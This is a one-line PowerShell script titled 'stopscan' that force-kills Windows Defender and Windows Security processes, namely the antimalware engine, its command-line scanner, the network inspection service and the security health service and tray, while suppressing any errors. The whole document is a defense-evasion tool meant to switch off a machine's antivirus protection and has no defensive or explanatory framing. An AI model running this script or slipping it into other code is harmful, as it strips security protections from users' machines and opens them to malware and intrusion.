<#
.SYNOPSIS
    stopscan
#>
"MsMpEng","MpCmdRun","NisSrv","SecurityHealthService","SecurityHealthSystray" | %{ taskkill /F /IM "$_.exe" 2>$null }
